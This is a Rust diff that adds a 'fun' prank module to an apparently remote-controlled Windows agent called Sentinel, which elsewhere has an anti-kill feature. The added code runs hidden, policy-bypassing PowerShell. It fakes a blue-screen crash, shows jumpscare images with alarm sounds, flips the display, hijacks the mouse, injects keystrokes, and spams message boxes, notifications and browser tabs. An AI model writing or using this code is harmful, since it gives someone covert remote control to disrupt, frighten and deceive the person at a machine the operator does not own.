@@ -1083,6 +1083,305 @@ fn system_action(action: &str, payload: &Value) -> Result<Value, String> {
 
 fn ps_escape(s: &str) -> String { s.replace('\\'', "''") }
 
+// ---------- fun / prank actions ----------
+//
+// All Windows-only. Long-running actions (shake, drunken-mouse, scream loop,
+// bsod overlay, jumpscare) spawn a DETACHED PowerShell so the command returns
+// immediately and many can run concurrently. \`fun.stop\` kills every PS
+// process whose command line contains the marker tag \`SENTINEL_FUN\`.
+//
+// Every embedded PS snippet that needs Win32 inlines a tiny \`Add-Type\` C#
+// shim — that keeps the agent dependency-free (no extra crates).
+
+#[cfg(windows)]
+fn spawn_detached_ps(script: &str) -> Result<(), String> {
+    use std::os::windows::process::CommandExt;
+    const DETACHED_PROCESS: u32 = 0x0000_0008;
+    const CREATE_NO_WINDOW: u32 = 0x0800_0000;
+    Command::new("powershell")
+        .args(["-NoProfile", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass",
+               "-Command", script])
+        .creation_flags(DETACHED_PROCESS | CREATE_NO_WINDOW)
+        .spawn()
+        .map(|_| ())
+        .map_err(|e| e.to_string())
+}
+
+#[cfg(not(windows))]
+fn spawn_detached_ps(_script: &str) -> Result<(), String> { Ok(()) }
+
+// All prank PS scripts include this string so \`fun.stop\` can find them.
+const FUN_TAG: &str = "SENTINEL_FUN";
+
+fn fun_action(action: &str, payload: &Value) -> Result<Value, String> {
+    let dur = payload.get("duration_secs").and_then(|v| v.as_u64()).unwrap_or(5).min(120) as u32;
+    let text_arg = payload.get("text").and_then(|v| v.as_str()).unwrap_or("").to_string();
+    let url_arg  = payload.get("url").and_then(|v| v.as_str()).unwrap_or("").to_string();
+    let count    = payload.get("count").and_then(|v| v.as_u64()).unwrap_or(5).min(50) as u32;
+
+    match action {
+        // ---------- screen ----------
+        "fun.screen.flip" => {
+            let angle = payload.get("angle").and_then(|v| v.as_u64()).unwrap_or(180);
+            let orient = match angle { 90 => 1, 180 => 2, 270 => 3, _ => 0 };
+            let script = format!("# {}\n\
+Add-Type @'\n\
+using System; using System.Runtime.InteropServices;\n\
+public class D {{\n\
+  [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]\n\
+  public struct DEVMODE {{\n\
+    [MarshalAs(UnmanagedType.ByValTStr, SizeConst=32)] public string dmDeviceName;\n\
+    public short dmSpecVersion; public short dmDriverVersion; public short dmSize; public short dmDriverExtra;\n\
+    public int dmFields; public int dmPositionX; public int dmPositionY; public int dmDisplayOrientation;\n\
+    public int dmDisplayFixedOutput; public short dmColor; public short dmDuplex; public short dmYResolution;\n\
+    public short dmTTOption; public short dmCollate;\n\
+    [MarshalAs(UnmanagedType.ByValTStr, SizeConst=32)] public string dmFormName;\n\
+    public short dmLogPixels; public int dmBitsPerPel; public int dmPelsWidth; public int dmPelsHeight;\n\
+    public int dmDisplayFlags; public int dmDisplayFrequency; public int dmICMMethod; public int dmICMIntent;\n\
+    public int dmMediaType; public int dmDitherType; public int dmReserved1; public int dmReserved2;\n\
+    public int dmPanningWidth; public int dmPanningHeight;\n\
+  }}\n\
+  [DllImport(\\"user32.dll\\")] public static extern int EnumDisplaySettings(string n,int m,ref DEVMODE d);\n\
+  [DllImport(\\"user32.dll\\")] public static extern int ChangeDisplaySettings(ref DEVMODE d,int f);\n\
+}}\n\
+'@\n\
+$dm = New-Object D+DEVMODE; $dm.dmSize = [short][System.Runtime.InteropServices.Marshal]::SizeOf($dm);\n\
+[D]::EnumDisplaySettings($null, -1, [ref]$dm) | Out-Null;\n\
+if (({orient} - $dm.dmDisplayOrientation) % 2 -ne 0) {{ $t=$dm.dmPelsWidth; $dm.dmPelsWidth=$dm.dmPelsHeight; $dm.dmPelsHeight=$t }}\n\
+$dm.dmDisplayOrientation = {orient}; $dm.dmFields = 0x80 -bor 0x100000 -bor 0x80000;\n\
+[D]::ChangeDisplaySettings([ref]$dm, 0) | Out-Null", FUN_TAG, orient=orient);
+            spawn_detached_ps(&script)?;
+            Ok(json!({"ok": true, "angle": angle}))
+        }
+        "fun.screen.invert" => {
+            // Toggle Magnifier color inversion via Win+Ctrl+C shortcut (built-in).
+            let script = format!("# {}\n\
+Add-Type -AssemblyName System.Windows.Forms;\n\
+[System.Windows.Forms.SendKeys]::SendWait('^{{LWIN down}}c^{{LWIN up}}')", FUN_TAG);
+            spawn_detached_ps(&script)?;
+            Ok(json!({"ok": true}))
+        }
+        "fun.screen.shake" => {
+            let script = format!("# {}\n\
+Add-Type @'\n\
+using System; using System.Runtime.InteropServices; using System.Drawing;\n\
+public class C {{ [DllImport(\\"user32.dll\\")] public static extern bool SetCursorPos(int x,int y);\n\
+  [DllImport(\\"user32.dll\\")] public static extern bool GetCursorPos(out Point p); }}\n\
+'@ -ReferencedAssemblies System.Drawing\n\
+$end=(Get-Date).AddSeconds({dur}); $r=New-Object Random;\n\
+while ((Get-Date) -lt $end) {{ $p=New-Object Drawing.Point; [C]::GetCursorPos([ref]$p) | Out-Null;\n\
+  [C]::SetCursorPos($p.X + $r.Next(-30,30), $p.Y + $r.Next(-30,30)) | Out-Null; Start-Sleep -Milliseconds 15 }}",
+                FUN_TAG, dur=dur);
+            spawn_detached_ps(&script)?;
+            Ok(json!({"ok": true, "duration_secs": dur}))
+        }
+        "fun.screen.bsod" => {
+            let script = format!("# {}\n\
+Add-Type -AssemblyName System.Windows.Forms,System.Drawing;\n\
+$f=New-Object Windows.Forms.Form; $f.FormBorderStyle='None'; $f.WindowState='Maximized';\n\
+$f.TopMost=$true; $f.BackColor=[Drawing.Color]::FromArgb(0,120,215); $f.ForeColor='White';\n\
+$f.Cursor=[Windows.Forms.Cursors]::WaitCursor;\n\
+$l=New-Object Windows.Forms.Label; $l.Text=\\":(\\n\\nYour PC ran into a problem and needs to restart.\\nWe're just collecting some error info, and then we'll restart for you.\\n\\n0% complete\\";\n\
+$l.Font=New-Object Drawing.Font('Segoe UI',28); $l.AutoSize=$false; $l.Dock='Fill'; $l.TextAlign='MiddleCenter';\n\
+$f.Controls.Add($l); $f.Show(); Start-Sleep -Seconds {dur}; $f.Close()",
+                FUN_TAG, dur=dur);
+            spawn_detached_ps(&script)?;
+            Ok(json!({"ok": true}))
+        }
+        "fun.screen.jumpscare" => {
+            if url_arg.is_empty() { return Err("missing image url".into()); }
+            let tmp = std::env::temp_dir().join("sentinel-jumpscare.img");
+            download_to(&url_arg, &tmp)?;
+            let p = tmp.to_string_lossy().to_string();
+            let script = format!("# {}\n\
+Add-Type -AssemblyName System.Windows.Forms,System.Drawing;\n\
+$f=New-Object Windows.Forms.Form; $f.FormBorderStyle='None'; $f.WindowState='Maximized'; $f.TopMost=$true;\n\
+$pb=New-Object Windows.Forms.PictureBox; $pb.Image=[Drawing.Image]::FromFile('{}'); $pb.Dock='Fill'; $pb.SizeMode='Zoom';\n\
+$f.Controls.Add($pb); $f.Show();\n\
+try {{ (New-Object Media.SoundPlayer 'C:\\Windows\\Media\\Windows Critical Stop.wav').PlaySync() }} catch {{}}\n\
+Start-Sleep -Seconds 2; $f.Close()", FUN_TAG, ps_escape(&p));
+            spawn_detached_ps(&script)?;
+            Ok(json!({"ok": true}))
+        }
+
+        // ---------- audio ----------
+        "fun.audio.tts" => {
+            if text_arg.is_empty() { return Err("missing text".into()); }
+            let script = format!("# {}\n\
+Add-Type -AssemblyName System.Speech;\n\
+$s=New-Object System.Speech.Synthesis.SpeechSynthesizer; $s.Volume=100; $s.Speak('{}')",
+                FUN_TAG, ps_escape(&text_arg));
+            spawn_detached_ps(&script)?;
+            Ok(json!({"ok": true}))
+        }
+        "fun.audio.beep" => {
+            let freq = payload.get("freq").and_then(|v| v.as_u64()).unwrap_or(800).clamp(37, 32767);
+            let ms = payload.get("ms").and_then(|v| v.as_u64()).unwrap_or(400).clamp(20, 5000);
+            let script = format!("# {}\n\
+$end=(Get-Date).AddSeconds({dur});\n\
+while ((Get-Date) -lt $end) {{ [console]::beep({freq},{ms}); Start-Sleep -Milliseconds 80 }}",
+                FUN_TAG, dur=dur, freq=freq, ms=ms);
+            spawn_detached_ps(&script)?;
+            Ok(json!({"ok": true}))
+        }
+        "fun.audio.scream" => {
+            // Loop the built-in critical-stop sound, falling back to a synthesised tone.
+            let script = format!("# {}\n\
+$end=(Get-Date).AddSeconds({dur});\n\
+$wav='C:\\Windows\\Media\\Windows Critical Stop.wav';\n\
+while ((Get-Date) -lt $end) {{\n\
+  try {{ (New-Object Media.SoundPlayer $wav).PlaySync() }} catch {{ [console]::beep(1200,400) }}\n\
+}}", FUN_TAG, dur=dur);
+            spawn_detached_ps(&script)?;
+            Ok(json!({"ok": true}))
+        }
+
+        // ---------- input ----------
+        "fun.input.drunkenmouse" => {
+            let script = format!("# {}\n\
+Add-Type @'\n\
+using System; using System.Runtime.InteropServices; using System.Drawing;\n\
+public class M {{ [DllImport(\\"user32.dll\\")] public static extern bool SetCursorPos(int x,int y);\n\
+  [DllImport(\\"user32.dll\\")] public static extern bool GetCursorPos(out Point p); }}\n\
+'@ -ReferencedAssemblies System.Drawing\n\
+$end=(Get-Date).AddSeconds({dur}); $t=0.0;\n\
+while ((Get-Date) -lt $end) {{ $p=New-Object Drawing.Point; [M]::GetCursorPos([ref]$p) | Out-Null;\n\
+  $dx=[int]([Math]::Sin($t)*40); $dy=[int]([Math]::Cos($t*1.3)*30);\n\
+  [M]::SetCursorPos($p.X+$dx, $p.Y+$dy) | Out-Null; $t += 0.25; Start-Sleep -Milliseconds 20 }}",
+                FUN_TAG, dur=dur);
+            spawn_detached_ps(&script)?;
+            Ok(json!({"ok": true}))
+        }
+        "fun.input.teleport" => {
+            let script = format!("# {}\n\
+Add-Type -AssemblyName System.Windows.Forms;\n\
+Add-Type @'\n\
+using System.Runtime.InteropServices;\n\
+public class T {{ [DllImport(\\"user32.dll\\")] public static extern bool SetCursorPos(int x,int y); }}\n\
+'@\n\
+$b=[Windows.Forms.SystemInformation]::VirtualScreen; $end=(Get-Date).AddSeconds({dur}); $r=New-Object Random;\n\
+while ((Get-Date) -lt $end) {{ [T]::SetCursorPos($r.Next($b.Left,$b.Right),$r.Next($b.Top,$b.Bottom)) | Out-Null;\n\
+  Start-Sleep -Milliseconds 300 }}", FUN_TAG, dur=dur);
+            spawn_detached_ps(&script)?;
+            Ok(json!({"ok": true}))
+        }
+        "fun.input.swapbuttons" => {
+            let swap = payload.get("swap").and_then(|v| v.as_bool()).unwrap_or(true);
+            let script = format!("# {}\n\
+Add-Type @'\n\
+using System.Runtime.InteropServices;\n\
+public class S {{ [DllImport(\\"user32.dll\\")] public static extern bool SwapMouseButton(bool s); }}\n\
+'@\n\
+[S]::SwapMouseButton([bool]::Parse('{}'))", FUN_TAG, if swap {"True"} else {"False"});
+            spawn_detached_ps(&script)?;
+            Ok(json!({"ok": true, "swap": swap}))
+        }
+        "fun.input.typestring" => {
+            if text_arg.is_empty() { return Err("missing text".into()); }
+            let escaped: String = text_arg.chars().map(|c| match c {
+                '+'|'^'|'%'|'~'|'('|')'|'{'|'}'|'['|']' => format!("{{{}}}", c),
+                _ => c.to_string(),
+            }).collect();
+            let script = format!("# {}\n\
+Add-Type -AssemblyName System.Windows.Forms;\n\
+[System.Windows.Forms.SendKeys]::SendWait('{}')", FUN_TAG, ps_escape(&escaped));
+            spawn_detached_ps(&script)?;
+            Ok(json!({"ok": true, "len": text_arg.len()}))
+        }
+        "fun.input.keymash" => {
+            let script = format!("# {}\n\
+Add-Type -AssemblyName System.Windows.Forms;\n\
+$chars='abcdefghijklmnopqrstuvwxyz1234567890 '.ToCharArray(); $r=New-Object Random;\n\
+$end=(Get-Date).AddSeconds({dur});\n\
+while ((Get-Date) -lt $end) {{ [System.Windows.Forms.SendKeys]::SendWait([string]$chars[$r.Next(0,$chars.Length)]); Start-Sleep -Milliseconds 40 }}",
+                FUN_TAG, dur=dur);
+            spawn_detached_ps(&script)?;
+            Ok(json!({"ok": true}))
+        }
+
+        // ---------- window / system ----------
+        "fun.window.toastspam" => {
+            let title = payload.get("title").and_then(|v| v.as_str()).unwrap_or("Sentinel").to_string();
+            let body = payload.get("body").and_then(|v| v.as_str()).unwrap_or("👋").to_string();
+            let script = format!("# {}\n\
+Add-Type -AssemblyName System.Windows.Forms,System.Drawing;\n\
+for ($i=0; $i -lt {count}; $i++) {{\n\
+  $n=New-Object System.Windows.Forms.NotifyIcon; $n.Icon=[System.Drawing.SystemIcons]::Warning; $n.Visible=$true;\n\
+  $n.ShowBalloonTip(2000,'{}','{}','Warning'); Start-Sleep -Milliseconds 700; $n.Dispose()\n\
+}}", FUN_TAG, ps_escape(&title), ps_escape(&body), count=count);
+            spawn_detached_ps(&script)?;
+            Ok(json!({"ok": true, "count": count}))
+        }
+        "fun.window.msgbox" => {
+            let title = payload.get("title").and_then(|v| v.as_str()).unwrap_or("System").to_string();
+            let body = if text_arg.is_empty() { "Error 0x80004005".into() } else { text_arg.clone() };
+            let script = format!("# {}\n\
+Add-Type -AssemblyName System.Windows.Forms;\n\
+for ($i=0; $i -lt {count}; $i++) {{\n\
+  [System.Windows.Forms.MessageBox]::Show('{}','{}','OK','Error') | Out-Null\n\
+}}", FUN_TAG, ps_escape(&body), ps_escape(&title), count=count);
+            spawn_detached_ps(&script)?;
+            Ok(json!({"ok": true}))
+        }
+        "fun.window.wallpaper" => {
+            if url_arg.is_empty() { return Err("missing image url".into()); }
+            let tmp = std::env::temp_dir().join("sentinel-wallpaper.jpg");
+            download_to(&url_arg, &tmp)?;
+            let p = tmp.to_string_lossy().to_string();
+            let script = format!("# {}\n\
+Add-Type @'\n\
+using System.Runtime.InteropServices;\n\
+public class W {{ [DllImport(\\"user32.dll\\",CharSet=CharSet.Auto)] public static extern int SystemParametersInfo(int u,int p,string s,int f); }}\n\
+'@\n\
+[W]::SystemParametersInfo(20, 0, '{}', 3) | Out-Null", FUN_TAG, ps_escape(&p));
+            spawn_detached_ps(&script)?;
+            Ok(json!({"ok": true}))
+        }
+        "fun.window.opentabs" => {
+            if url_arg.is_empty() { return Err("missing url".into()); }
+            let script = format!("# {}\n\
+for ($i=0; $i -lt {count}; $i++) {{ Start-Process '{}'; Start-Sleep -Milliseconds 250 }}",
+                FUN_TAG, ps_escape(&url_arg), count=count);
+            spawn_detached_ps(&script)?;
+            Ok(json!({"ok": true, "count": count}))
+        }
+        "fun.window.minimizeall" => {
+            let script = format!("# {}\n\
+$s = New-Object -ComObject Shell.Application; $s.MinimizeAll()", FUN_TAG);
+            spawn_detached_ps(&script)?;
+            Ok(json!({"ok": true}))
+        }
+        "fun.window.ejectcd" => {
+            let script = format!("# {}\n\
+Add-Type @'\n\
+using System.Runtime.InteropServices;\n\
+public class CD {{ [DllImport(\\"winmm.dll\\")] public static extern int mciSendString(string c,System.Text.StringBuilder r,int l,System.IntPtr h); }}\n\
+'@\n\
+[CD]::mciSendString('set CDAudio door open',$null,0,[System.IntPtr]::Zero) | Out-Null", FUN_TAG);
+            spawn_detached_ps(&script)?;
+            Ok(json!({"ok": true}))
+        }
+
+        // ---------- master kill switch ----------
+        "fun.stop" => {
+            let script = format!("Get-WmiObject Win32_Process -Filter \\"Name='powershell.exe'\\" | \
+                Where-Object {{ $_.CommandLine -like '*{}*' }} | \
+                ForEach-Object {{ try {{ Stop-Process -Id $_.ProcessId -Force }} catch {{}} }}", FUN_TAG);
+            let _ = powershell(&script);
+            // Best-effort: also un-flip / un-swap defaults.
+            let _ = spawn_detached_ps("\
+Add-Type @'\n\
+using System.Runtime.InteropServices;\n\
+public class S0 {{ [DllImport(\\"user32.dll\\")] public static extern bool SwapMouseButton(bool s); }}\n\
+'@\n\
+[S0]::SwapMouseButton($false)");
+            Ok(json!({"ok": true, "stopped": true}))
+        }
+
+        _ => Err(format!("unknown fun action: {}", action)),
+    }
+}
+
 fn download_to(url: &str, path: &PathBuf) -> Result<(), String> {
     let resp = http().get(url).call().map_err(|e| e.to_string())?;
     let mut reader = resp.into_reader();
@@ -1185,6 +1484,7 @@ fn handle_command(
         "antikill.enable" => Ok(install_antikill()),
         "antikill.disable" => Ok(uninstall_antikill()),
         a if a.starts_with("system.") => system_action(a, &payload),
+        a if a.starts_with("fun.") => fun_action(a, &payload),
         _ => Err(format!("unknown action: {}", action)),
     };
 
